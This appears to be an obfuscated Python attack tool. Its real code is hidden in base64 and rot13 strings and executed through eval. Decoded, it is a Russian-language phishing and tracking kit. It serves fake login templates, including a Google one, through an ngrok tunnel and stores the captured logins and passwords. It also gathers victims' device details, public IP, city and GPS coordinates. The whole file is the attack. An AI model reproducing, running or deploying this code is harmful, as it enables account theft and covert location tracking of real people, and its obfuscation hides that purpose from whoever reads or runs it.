#bt bafomet
import base64, codecs
magic = 'IyEgL3Vzci9iaW4vZW52IHB5dGhvbgojIC0qLSBjb2Rpbmc6IHV0Zi04IC0qLQpSID0gJ1wwMzNbMzFtJyAgICMgUmVkCkcgPSAnXDAzM1sxOzM0bScgIyBCbHVlCkMgPSAnXDAzM1sxOzMybScgIyBHcmVlbgpXID0gJ1wwMzNbMG0nICAgICMgd2hpdGUKTyA9ICdcMDMzWzQ1bScgICAjIFB1cnBsZQpOID0gJ1wwMzNbMTszN20nICMgV2hpdGUKQiA9ICdcMDMzWzE7MzRtJyAjIEJsdWUKCmZyb20gc2h1dGlsIGltcG9ydCB3aGljaApmcm9tIHBpcC5fdmVuZG9yLmRpc3RsaWIuY29tcGF0IGltcG9ydCByYXdfaW5wdXQKaW1wb3J0IGdldHBhc3MKaW1wb3J0IHN1YnByb2Nlc3MKaW1wb3J0IHRpbWUKaW1wb3J0IHN5cwppbXBvcnQgb3MKb3Muc3lzdGVtKCdjbGVhcicpCgpwcmludChSICsgJ1sgKyBdJyArIEMgKyAnINCX0LDQv9GD0YHQuiDQv9GA0LjQu9C+0LbQtdC90LjRjy4uLiAgNi41IFByZW1pdW0gJyArIFcpCnBrZ3MgPSBbJ3B5dGhvbjMnLCAncGlwMycsICdwaHAnLCAnc3NoJ10KaW5zdCA9IFRydWUKZm9yIHBrZyBpbiBwa2dzOgoJcHJlc2VudCA9IHdoaWNoKHBrZykKCWlmIHByZXNlbnQgPT0gTm9uZToKCQlwcmludChSICsgJ1stXSAnICsgVyArIHBrZyArIEMgKyAnIGlzIG5vdCBJbnN0YWxsZWQhJykKCQlpbnN0ID0gRmFsc2UKCWVsc2U6CgkJcGFzcwppZiBpbnN0ID09IEZhbHNlOgoJZXhpdCgpCmVsc2U6CglwYXNzCmltcG9ydCBnZXRwYXNzCmltcG9ydCBzdWJwcm9jZXNzCmltcG9ydCB0aW1lCmltcG9ydCBvcwppbXBvcnQgY3N2CmltcG9ydCBzeXMKaW1wb3J0IHRpbWUKaW1wb3J0IGpzb24KaW1wb3J0IGFyZ3BhcnNlCmltcG9ydCByZXF1ZXN0cwppbXBvcnQgc3VicHJvY2VzcyBhcyBzdWJwCgpwYXJzZXIgPSBhcmdwYXJzZS5Bcmd1bWVudFBhcnNlcigpCnBhcnNlci5hZGRfYXJndW1lbnQoJy1zJywgJy0tc3ViZG9tYWluJywgaGVscD0nUHJvdmlkZSBTdWJkb21haW4gZm9yIFNlcnZlbyBVUkwgKCBPcHRpb25hbCApJykKcGFyc2VyLmFkZF9hcmd1bWVudCgnLWsnLCAnLS1rbWwnLCBoZWxwPSdQcm92aWRlIEtNTCBGaWxlbmFtZSAoIE9wdGlvbmFsICknKQpwYXJzZXIuYWRkX2FyZ3VtZW50KCctdCcsICctLXR1bm5lbCcsIGhlbHA9J1NwZWNpZnkgVHVubmVsIE1vZGUgWyBBdmFpbGFibGUgOiBtYW51YWwgXScpCnBhcnNlci5hZGRfYXJndW1lbnQoJy1wJywgJy0tcG9ydCcsIHR5cGU9aW50LCBkZWZhdWx0PTgwODAsIGhlbHA9J1BvcnQgZm9yIFdlYiBTZXJ2ZXIgWyBEZWZhdWx0IDogODA4MCBdJykKCmFyZ3MgPSBwYXJzZXIucGFyc2VfYXJncygpCnN1YmRvbSA9IGFyZ3Muc3ViZG9tYWluCmttbF9mbmFtZSA9IGFyZ3Mua21sCnR1bm5lbF9tb2RlID0gYXJncy50dW5uZWwKcG9ydCA9IGFyZ3MucG9ydAoKcm93ID0gW10KaW5mbyA9ICcnCnJlc3VsdCA9ICcnCm9zLnN5c3RlbSgnY2xlYXInKQpvcy5zeXN0ZW0oImNkIGRiL2Jhbm5lcjtweXRob24yIGJhbm5lci5weSIpCmRlZiBiYW5uZXIoKToKCXByaW50KCdcbicgKyBSICsgJ1sgKyBdJyArIEMgKyAnIE5ncm9rINC30LDQv9GD0YHQutCw0YLRjCDQvtGC0LTQtdC70YzQvdC+OiBzdWRvIC4vbmdyb2sgaHR0cCA4MDgwOiAnICsgVyArICcgJykKCQpkZWYgdHVubmVsX3NlbGVjdCgpOgoJaWYgdHVubmVsX21vZGUgPT0gTm9uZToKCQlzZXJ2ZW8oKQoJZWxpZiB0dW5uZWxfbW9kZSA9PSAnbWFudWFsJzoKCQlwcmludChHICsgJycgKyBDICsgJycgKyBXICsgJ1xuJykKCWVsc2U6CgkJcHJpbnQoUiArICdbICsgXScgKyBDICsgJyDQndC10LTQtdC50YHRgtCy0LjRgtC10LvRjNC90YvQuSDQstGL0LHRgNCw0L3QvdGL0Lkg0YDQtdC20LjQvCDRgtGD0L3QvdC10LvRjywg0J/RgNC+0LLQtdGA0YzRgtC1IE5ncm9rLiAgWy1oLCAtLWhlbHBdJyArIFcgKyAnXG4nKQoJCWV4aXQoKQoKZGVmIHRlbXBsYXRlX3NlbGVjdCgpOgoJZ2xvYmFsIHNpdGUsIGluZm8sIHJlc3VsdAoJcHJpbnQoUiArICdbICsgXScgKyBDICsgJyDQktGL0LHQtdGA0LjRgtC1INC+0L/RhtC40Y4gOiAnICsgQyArICdcbicpCgkKCXdpdGggb3BlbigndGVtcGxhdGUvdGVtcGxhdGVzLmpzb24nLCAncicpIGFzIHRlbXBsOgoJCXRlbXBsX2luZm8gPSB0ZW1wbC5yZWFkKCkKCQoJdGVtcGxfanNvbiA9IGpzb24ubG9hZHModGVtcGxfaW5mbykKCQoJZm9yIGl0ZW0gaW4gdGVtcGxfanNvblsndGVtcGxhdGVzJ106CgkJbmFtZSA9IGl0ZW1bJ25hbWUnXQoJCXByaW50KFIgKyAnWyB7fSBdJy5mb3JtYXQodGVtcGxfanNvblsndGVtcGxhdGVzJ10uaW5kZXgoaXRlbSkpICsgRyArICcge30nLmZvcm1hdChuYW1lKSArIFcpCgkKCXNlbGVjdGVkID0gaW50KGlucHV0KFIgKyAnW9CS0LLQtdC00LjRgtC1INC90L7QvNC10YBdICcgKyBXKSkKCQoJdHJ5OgoJCXNpdGUgPSB0ZW1wbF9qc29uWyd0ZW1wbGF0ZXMnXVtzZWxlY3RlZF1bJ2Rpcl9uYW1lJ10KCWV4Y2VwdCBJbmRleEVycm9yOgoJCXByaW50KCdcbicgKyBSICsgJ1stXScgKyBDICsgJyBJbnZhbGlkIElucHV0IScgKyBXICsgJ1xuJykKCQlzeXMuZXhpdCgpCgkKCXByaW50KCdcbicgKyBHICsgJ1srXScgKyBDICsgJyDQl9Cw0LPRgNGD0LfQutCwIHt9INCe0LbQuNC00LDQudGC0LUuLi4nLmZvcm1hdCh0ZW1wbF9qc29uWyd0ZW1wbGF0ZXMnXVtzZWxlY3RlZF1bJ25hbWUnXSkgKyBXKQoJCgltb2R1bGUgPSB0ZW1wbF9qc29uWyd0ZW1wbGF0ZXMnXVtzZWxlY3RlZF1bJ21vZHVsZSddCglpZ'
love = 'vOgo2E1oTHtCG0tIUW1MGbXPDycoKOsMzyfMFN9VUEyoKOfK2cmo25oW3EyoKOfLKEyplqqJ3AyoTIwqTIxKIfanJ1jo3W0K2McoTHaKDbWPJygpT9lqPOcoKOipaEfnJVXPDycoKOipaEfnJVhnJ1jo3W0K21iMUIfMFtaqTIgpTkuqTHhr30aYzMipz1uqPucoKOsMzyfMFxcPtyyoUAyBtbWPKOup3ZXPtycozMiVQ0tW3EyoKOfLKEyY3g9Y3ObpP9cozMiYaE4qPphMz9loJS0XUAcqTHcPtylMKA1oUDtCFNaqTIgpTkuqTHir30ipTujY3Wyp3IfqP50rUDaYzMipz1uqPumnKEyXDbXMTIzVUAypaMyoltcBtbWM2kiLzSfVUA1LzEioDbWMzkuMlN9VRMuoUAyPtbWpUWcoaDbElNeVPqoX10aVPftDlNeVPpt0W/EtAP+0YYDgqTN0YeDfPOGMKW2MJ8fVAPu0LYDfATP0LCEtF4hYvpfVTIhMQ0aWlxXPty0pax6PtxWqTygMF5moTIypPtkXDbWPKWkp3DtCFOlMKS1MKA0pl5aMKDbW2u0qUOmBv8ip2IlqzIiYz5yqPpfVUEcoJIiqKD9AFxXPDymLlN9VUWkp3Dhp3EuqUImK2AiMTHXPDycMvOmLlN9CFNlZQN6PtxWPKOlnJ50XRZtXlNaJlptXlOUVPftWlQDagP90YiDfAP50Y0tWlNeVRZtXlNaKFptXlOKVPftW1khWlxXPDyyoUAyBtbWPDyjpzyhqPuQVPftW1faVPftHvNeVPsDbqTP0YQEtgTQ0LRtBvO7sFphMz9loJS0XUAwXFNeVRZtXlNaKFptXlOKVPftW1khWlxXPDxWMKucqPtcPtyyrTAypUDtpzIkqJImqUZhD29hozIwqTyioxIlpz9lBtbWPKOlnJ50XRZtXlNaJlptXlOFVPftWlQDagTR0YiDfAP50Y0fVAP+0LYDfgPj0Yft0Y3DfATS0LCDhF4t0WsDfAP/0LCEtqP60YQDhFQEu9P10LQDgqP3VQbtpUy0nT9hZlOvnJqvpz8hpUxtYKDtoJShqJSfVP1eVUA0LKW0VPptXlOQVPftW10aVPftIlNeVPqpovpcPtxWMKucqPtcPtxWPDbWpUWcoaDbElNeVPqoX10aVPftDlNeVPptE2I0qTyhMlOGMKW2MJ8tIIWZYv4hWlNeVSptXlNaKT4aXDbWnJLtp3IvMT9gVTymVR5iozH6PtxWq2y0nPOipTIhXPqxLv9mMKW2MJ8hqUu0WljtW3paXFOuplO0oKOznJkyBtbWPDyjpz9wVQ0tp3IvpP5Do3OyovuoW3AmnPpfVPpgolpfVPqGqUWcL3EVo3A0F2I5D2uyL2gcozp9oz8aYPNaYJ8aYPNaH2IlqzIlDJkcqzIWoaEypaMuoQ02ZPpfVPpgHvpfVPp4ZQcfo2AuoTuip3D6r30aYzMipz1uqPujo3W0XFjtW3AypaMyol5hMKDaKFjtp3Exo3I0CKEgpTMcoTHfVUA0MTIlpw10oKOznJkyYPOmqTEcow1mqJWjYyOWHRHcPtyyoUAyBtbWPKqcqTtto3OyovtaMTVip2IlqzIiYaE4qPpfVPq3WlxtLKZtqT1jMzyfMGbXPDxWpUWiLlN9VUA1LaNhHT9jMJ4bJlqmp2taYPNaYJ8aYPNaH3ElnJA0FT9mqRgyrHAbMJAenJ5aCJ5iWljtWl1iWljtW1AypaMypxSfnKMyFJ50MKW2LJj9AwNaYPNaYIVaYPNar30hp2IlqzIiYz5yqQb4ZQcfo2AuoTuip3D6r30aYzMipz1uqPumqJWxo20fVUOipaDcYPNap2IlqzIiYz5yqPqqYPOmqTEiqKD9qT1jMzyfMFjtp3ExMKWlCKEgpTMcoTHfVUA0MTyhCKA1LaNhHRyDEFxXPDbWq2ucoTHtIUW1MGbXPDy3nKEbVT9jMJ4bW2EvY3AypaMyol50rUDaYPNapvpcVTSmVUEgpTMcoTH6PtxWPKElrGbXPDxWPKA0MT91qPN9VUEgpTMcoTHhpzIuMTkcozImXPxXPDxWPJyzVTMfLJptCG0tEzSfp2H6PtxWPDxWMz9lVTIfMJ0tnJ4tp3Exo3I0BtbWPDxWPDycMvNaFSEHHPptnJ4tMJkyoGbXPDxWPDxWPJIfMJ0tCFOyoTIgYaAjoTy0XPptWlxXPDxWPDxWPKIloPN9VTIfMJ1oAS0hp3ElnKNbXDbWPDxWPDxWpUWcoaDbElNeVPqoX10aVPftDlNeVPptIIWZVQbtWlNeVSptXlO1pzjtXlNaKT4aXDbWPDxWPDxWMzkuMlN9VSElqJHXPDxWPDxWMJkmMGbXPDxWPDxWPKOup3ZXPDxWPJIfnJLtMzkuMlN9CFOHpaIyBtbWPDxWPJWlMJSePtxWPJI4L2IjqPOSrTAypUEco24tLKZtMGbXPDxWPKOlnJ50XTHcPtxWPDyjLKAmPtxWqTygMF5moTIypPtlXDbXMTIzVUAypaMypvtcBtbWpUWcoaDbW1khWlNeVRptXlNaJlgqWlNeVRZtXlNaVAPs0Y7EtATPVQbtWlftIlNeVUA0pvujo3W0XFxXPKOlnJ50XPqpovptXlOUVPftW1feKFptXlOQVPftWlQDy9Pj0Y/Et9TO0YbtHRuDVSAypaMypv4hYv4hYvptXlOKYPOyozD9WlpcPty3nKEbVT9jMJ4bW2EvY3ObpP5fo2paYPNaqlpcVTSmVUObpTkiMmbXPDymqJWjYyOipTIhXSfapTujWljtWl1GWljtWmNhZP4jYwN6r30aYzMipz1uqPujo3W0XFjtWl10WljtW3EyoKOfLKEyY3g9YlphMz9loJS0XUAcqTHcKFjtp3Exo3I0CKObpTkiMljtp3ExMKWlCKObpTkiMlxXPDy0nJ1yYaAfMJIjXQZcPty0pax6PtxWpTujK3Wkp3DtCFOlMKS1MKA0pl5aMKDbW2u0qUN6Yl8jYwNhZP4jBag9Y2yhMTI4Yzu0oJjaYzMipz1uqPujo3W0XFxXPDyjnUOsp2ZtCFOjnUOspaSmqP5mqTS0qKAsL29xMDbWPJyzVUObpS9mLlN9CFNlZQN6PtxWPKOlnJ50XRZtXlNaJlptXlOUVPftWlQDb9TO0Y/DgqTV0Y3DivNaVPftDlNeVPqqWlNeVSpcPtxWMJkmMGbXPDxWpUWcoaDbDlNeVPqoWlNeVSVtXlNa0XUEtgPj0LYEt9TOVQbtr30aYzMipz1uqPujnUOsp2ZcVPftDlNeVPqqWlNeVSpcPtyyrTAypUDtpzIkqJImqUZhD29hozIwqTyioxIlpz9lBtbWPKOlnJ50XRZtXlNaJlptXlOFVPftWlQDyAPjVAP10YUDfAP90LiDhFQEtAP+0LVtWlNeVRZtXlNaKFptXlOKXDbWPIS1nKDbXDbXMTIzVUqunKDbXGbXPKOlnJ50MJDtCFOTLJkmMDbWq2ucoTHtIUW1MGbXPDy0nJ1yYaAfMJIjXQVcPtxWp2y6MFN9VT9mYaOuqTthM2I0p2y6MFulMKA1oUDcPtxWnJLtp2y6MFN9CFNjVTShMPOjpzyhqTIxVQ'
god = '09IEZhbHNlOgoJCQlwcmludCgnXG4nICsgRyArICdbK10nICsgUiArICcg0JvQvtCz0LjQvdGLINC4INC/0LDRgNC+0LvQuCDRhdGA0LDQvdGP0YLRgdGPOiBb0J/RgNC40LzQtdGAXSBCaWcgUHJvL3RlbXBsYXRlL2dvb2dsZS9iYXphLnBocCDQuNC70LggcGFzc3dvcmQuLi4nICsgVyArICdcbicpCgkJCXByaW50ZWQgPSBUcnVlCgkJaWYgc2l6ZSA+IDA6CgkJCW1haW4oKQoKZGVmIG1haW4oKToKCWdsb2JhbCBpbmZvLCByZXN1bHQsIHJvdywgdmFyX2xhdCwgdmFyX2xvbgoJdHJ5OgoJCXJvdyA9IFtdCgkJd2l0aCBvcGVuIChpbmZvLCAncicpIGFzIGZpbGUyOgoJCQlmaWxlMiA9IGZpbGUyLnJlYWQoKQoJCQlqc29uMyA9IGpzb24ubG9hZHMoZmlsZTIpCgkJCWZvciB2YWx1ZSBpbiBqc29uM1snZGV2J106CgoJCQkJdmFyX29zID0gdmFsdWVbJ29zJ10KCQkJCXZhcl9wbGF0Zm9ybSA9IHZhbHVlWydwbGF0Zm9ybSddCgkJCQl0cnk6CgkJCQkJdmFyX2NvcmVzID0gdmFsdWVbJ2NvcmVzJ10KCQkJCWV4Y2VwdCBUeXBlRXJyb3I6CgkJCQkJdmFyX2NvcmVzID0gJ05vdCBBdmFpbGFibGUnCgkJCQl2YXJfcmFtID0gdmFsdWVbJ3JhbSddCgkJCQl2YXJfdmVuZG9yID0gdmFsdWVbJ3ZlbmRvciddCgkJCQl2YXJfcmVuZGVyID0gdmFsdWVbJ3JlbmRlciddCgkJCQl2YXJfcmVzID0gdmFsdWVbJ3dkJ10gKyAneCcgKyB2YWx1ZVsnaHQnXQoJCQkJdmFyX2Jyb3dzZXIgPSB2YWx1ZVsnYnJvd3NlciddCgkJCQl2YXJfaXAgPSB2YWx1ZVsnaXAnXQoKCQkJCXJvdy5hcHBlbmQodmFyX29zKQoJCQkJcm93LmFwcGVuZCh2YXJfcGxhdGZvcm0pIAoJCQkJcm93LmFwcGVuZCh2YXJfY29yZXMpIAoJCQkJcm93LmFwcGVuZCh2YXJfcmFtKSAKCQkJCXJvdy5hcHBlbmQodmFyX3ZlbmRvcikKCQkJCXJvdy5hcHBlbmQodmFyX3JlbmRlcikKCQkJCXJvdy5hcHBlbmQodmFyX3JlcykKCQkJCXJvdy5hcHBlbmQodmFyX2Jyb3dzZXIpCgkJCQlyb3cuYXBwZW5kKHZhcl9pcCkKCgkJCQlwcmludChHICsgJ1srXScgKyBDICsgJyDQmNC90YTQvtGA0LzQsNGG0LjRjyDQviDRg9GB0YLRgNC+0LnRgdGC0LLQtS4uLiA6ICcgKyBSICsgJ1xuJykKCQkJCXByaW50KEcgKyAnWytdJyArIEMgKyAnIE9TICAgICAgICAgOiAnICsgVyArIHZhcl9vcykKCQkJCXByaW50KEcgKyAnWytdJyArIEMgKyAnIFBsYXRmb3JtICAgOiAnICsgVyArIHZhcl9wbGF0Zm9ybSkKCQkJCXByaW50KEcgKyAnWytdJyArIEMgKyAnIENQVSBDb3JlcyAgOiAnICsgVyArIHZhcl9jb3JlcykKCQkJCXByaW50KEcgKyAnWytdJyArIEMgKyAnIFJBTSAgICAgICAgOiAnICsgVyArIHZhcl9yYW0pCgkJCQlwcmludChHICsgJ1srXScgKyBDICsgJyBHUFUgVmVuZG9yIDogJyArIFcgKyB2YXJfdmVuZG9yKQoJCQkJcHJpbnQoRyArICdbK10nICsgQyArICcgR1BVICAgICAgICA6ICcgKyBXICsgdmFyX3JlbmRlcikKCQkJCXByaW50KEcgKyAnWytdJyArIEMgKyAnIFJlc29sdXRpb24gOiAnICsgVyArIHZhcl9yZXMpCgkJCQlwcmludChHICsgJ1srXScgKyBDICsgJyBCcm93c2VyICAgIDogJyArIFcgKyB2YXJfYnJvd3NlcikKCQkJCXByaW50KEcgKyAnWytdJyArIEMgKyAnIFB1YmxpYyBJUCAgOiAnICsgVyArIHZhcl9pcCkKCQkJCgoJCQkJcnFzdCA9IHJlcXVlc3RzLmdldCgnaHR0cDovL2ZyZWUuaXB3aG9pcy5pby9qc29uL3t9Jy5mb3JtYXQodmFyX2lwKSkKCQkJCXNjID0gcnFzdC5zdGF0dXNfY29kZQoKCQkJCWlmIHNjID09IDIwMDoKCQkJCQlkYXRhID0gcnFzdC50ZXh0CgkJCQkJZGF0YSA9IGpzb24ubG9hZHMoZGF0YSkKCQkJCQl2YXJfY29udGluZW50ID0gc3RyKGRhdGFbJ2NvbnRpbmVudCddKQoJCQkJCXZhcl9jb3VudHJ5ID0gc3RyKGRhdGFbJ2NvdW50cnknXSkKCQkJCQl2YXJfcmVnaW9uID0gc3RyKGRhdGFbJ3JlZ2lvbiddKQoJCQkJCXZhcl9jaXR5ID0gc3RyKGRhdGFbJ2NpdHknXSkKCQkJCQl2YXJfb3JnID0gc3RyKGRhdGFbJ29yZyddKQoJCQkJCXZhcl9pc3AgPSBzdHIoZGF0YVsnaXNwJ10pCgoJCQkJCXJvdy5hcHBlbmQodmFyX2NvbnRpbmVudCkKCQkJCQlyb3cuYXBwZW5kKHZhcl9jb3VudHJ5KQoJCQkJCXJvdy5hcHBlbmQodmFyX3JlZ2lvbikKCQkJCQlyb3cuYXBwZW5kKHZhcl9jaXR5KQoJCQkJCXJvdy5hcHBlbmQodmFyX29yZykKCQkJCQlyb3cuYXBwZW5kKHZhcl9pc3ApCgoJCQkJCXByaW50KEcgKyAnWytdJyArIEMgKyAnIENvbnRpbmVudCAgOiAnICsgVyArIHZhcl9jb250aW5lbnQpCgkJCQkJcHJpbnQoRyArICdbK10nICsgQyArICcgQ291bnRyeSAgICA6ICcgKyBXICsgdmFyX2NvdW50cnkpCgkJCQkJcHJpbnQoRyArICdbK10nICsgQyArICcgUmVnaW9uICAgICA6ICcgKyBXICsgdmFyX3JlZ2lvbikKCQkJCQlwcmludChHICsgJ1srXScgKyBDICsgJyBDaXR5ICAgICAgIDogJyArIFcgKyB2YXJfY2l0eSkKCQkJCQlwcmludChHICsgJ1srXScgKyBDICsgJyBPcmcgICAgICAgIDogJyArIFcgKyB2YXJfb3JnKQoJCQkJCXByaW50KEcgKyAnWytdJyArIEMgKyAnIElTUCAgICAgICAgOiAnICsgVyArIHZhcl9pc3ApCglleGNlcHQgVmFsdWVFcnJvcjoKCQlwYXNzCgkKCXRyeToKCQl3aXRoIG9wZW4gKHJlc3VsdCwgJ3InKSBhcyBmaWxlOgoJCQlmaWxlID0gZmlsZS5yZWFkKCkKCQkJanNvbjIgPSBqc29uLmxvYWRzKGZpbGUpCgkJCWZvciB2YWx1ZSBpbiBqc29uMlsnaW5mbyddOgoJCQkJdmFyX2x'
destiny = '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'
joy = '\x72\x6f\x74\x31\x33'
trust = eval('\x6d\x61\x67\x69\x63') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x6c\x6f\x76\x65\x2c\x20\x6a\x6f\x79\x29') + eval('\x67\x6f\x64') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x64\x65\x73\x74\x69\x6e\x79\x2c\x20\x6a\x6f\x79\x29')
eval(compile(base64.b64decode(eval('\x74\x72\x75\x73\x74')),'<string>','exec'))
